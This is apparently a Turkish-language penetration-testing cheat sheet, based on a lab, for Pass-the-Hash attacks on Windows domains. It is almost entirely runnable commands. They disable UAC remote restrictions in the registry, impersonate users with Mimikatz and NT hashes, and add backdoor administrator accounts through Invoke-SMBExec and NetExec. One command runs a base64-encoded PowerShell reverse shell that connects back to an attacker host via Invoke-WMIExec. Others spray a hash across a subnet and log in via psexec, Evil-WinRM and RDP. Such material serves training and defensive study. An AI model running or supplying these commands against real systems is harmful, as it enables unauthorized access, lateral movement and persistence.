# Pass-the-Hash

!!! success

    [NTLM](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/b38c36ed-2804-4868-a9ff-8dd3182128e4) hash (NT hash) [salt olmadan](https://www.crowdstrike.com/en-us/cybersecurity-101/cyberattacks/pass-the-hash-attack/) depolanır.

!!! warning

    * Kerberos etkileşimi yoktur.
    * [NTLMv1](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/464551a8-9fc4-428e-b3d3-bc5bfb2e73a5) (Net-NTLMv1) Pass-the-Hash için kullanılamaz.
    * [NTLMv2](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/5e550938-91d4-459f-b67d-75d70009e3f3) (Net-NTLMv2) Pass-the-Hash için kullanılamaz.

## Local Account Limits

### Disabling [UAC Remote Restrictions](https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/user-account-control-and-remote-restriction)

| VALUE | SUCCESSFUL ATTACK |
|---|---|
| 0x0 ||
| 0x1 | + |

```pwsh
PS C:\Users\Administrator> reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```

```pwsh
PS C:\Users\Administrator> reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy
```

```output title="Output"
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
    LocalAccountTokenFilterPolicy    REG_DWORD    0x1
```

### Disabling [Admin Approval Mode](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/7c705718-f58e-4886-8057-37c8fd9aede1)

| VALUE | SUCCESSFUL ATTACK |
|---|---|
| 0x0 | + |
| 0x1 ||

```pwsh
PS C:\Users\Administrator> reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v FilterAdministratorToken /t REG_DWORD /d 0 /f
```

```pwsh
PS C:\Users\Administrator> reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v FilterAdministratorToken
```

```output title="Output"
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
    FilterAdministratorToken    REG_DWORD    0x0
```

## From Windows

### Mimikatz

```pwsh
PS C:\Users\Administrator> C:\Tools\mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /domain:INLANEFREIGHT.HTB /rc4:64F12CDDAA88057E06A81B54E73B949B /run:cmd.exe" exit
```

| PARAMETER | DESCRIPTION |
|---|---|
| /user | Taklit edilecek kullanıcı adı. |
| /domain | Domain adı. Yerel hesaplar için bilgisayar adı veya nokta kullanılabilir. |
| /rc4 | NTLM hash. |
| /run | Komut. |

### [Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec

!!! warning

    SMB protokolü yasaklı ise Evil-WinRM yöntemi denenebilir.

```pwsh
PS C:\Users\Administrator> Import-Module C:\Tools\Invoke-TheHash\Invoke-SMBExec.ps1
PS C:\Users\Administrator> Invoke-SMBExec -Target DC01 -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Domain INLANEFREIGHT.HTB -Command "net user mark P@ssw0rd /add && net localgroup Administrators mark /add" -Verbose
```

#### Invoke-WMIExec

| SOURCE NAME | SOURCE ADDRESS | TARGET NAME | TARGET ADDRESS |
|---|---|---|---|
| MS01 | 172.16.1.5:9001 | DC01 | 172.16.1.10 |

```pwsh
PS C:\Users\Administrator> Import-Module C:\Tools\Invoke-TheHash\Invoke-WMIExec.ps1
PS C:\Users\Administrator> Invoke-WMIExec -Target DC01 -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Domain INLANEFREIGHT.HTB -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA3ADIALgAxADYALgAxAC4ANQAiACwAOQAwADAAMQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=" -Verbose
```

## From Linux

### Impacket

!!! tip

    * [atexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py)
    * [psexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py)
    * [smbexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py)
    * [wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)

```sh
my@attack:~$ psexec.py Administrator@10.129.235.223 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```

### NetExec

#### [Password Spraying](https://www.netexec.wiki/smb-protocol/password-spraying)

!!! warning

    Bu işlem hesapları kilitleyebilir.

```sh
my@attack:~$ nxc smb 172.16.1.0/24 -u 'Administrator' -H 30B3783CE2ABF1AF70F77D0660CF3453 -d .
```

#### [Command Execution](https://www.netexec.wiki/smb-protocol/command-execution/execute-remote-command)

```sh
my@attack:~$ nxc smb 10.129.235.223 -u 'julio' -H 64F12CDDAA88057E06A81B54E73B949B -d INLANEFREIGHT.HTB -x 'net user hugh P@ssw0rd /add && net localgroup Administrators hugh /add'
```

### Evil-WinRM

```sh
my@attack:~$ evil-winrm -i 10.129.235.223 -u 'julio@inlanefreight.htb' -H 64F12CDDAA88057E06A81B54E73B949B
```

### xFreeRDP

[Restricted Admin Mode](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/dn408190(v=ws.11)#restricted-admin-mode-for-remote-desktop-connection) devre dışı ise Pass-the-Hash saldırısı başarısız olur.

Aktif etmek için:

```sh
my@attack:~$ sudo nxc smb 10.129.235.223 -u 'Administrator' -H 30B3783CE2ABF1AF70F77D0660CF3453 -d . -x 'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
```

```output title="Output" hl_lines="4"
SMB         10.129.235.223  445    MS01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False) (SMBv1:False)
SMB         10.129.235.223  445    MS01             [+] .\Administrator:30B3783CE2ABF1AF70F77D0660CF3453 (Pwn3d!)
SMB         10.129.235.223  445    MS01             [+] Executed command via wmiexec
SMB         10.129.235.223  445    MS01             The operation completed successfully.
```

Ardından aşağıdaki komut ile RDP bağlantısı gerçekleştir:

```sh
my@attack:~$ xfreerdp /v:10.129.235.223 /u:'Administrator' /pth:30B3783CE2ABF1AF70F77D0660CF3453
```
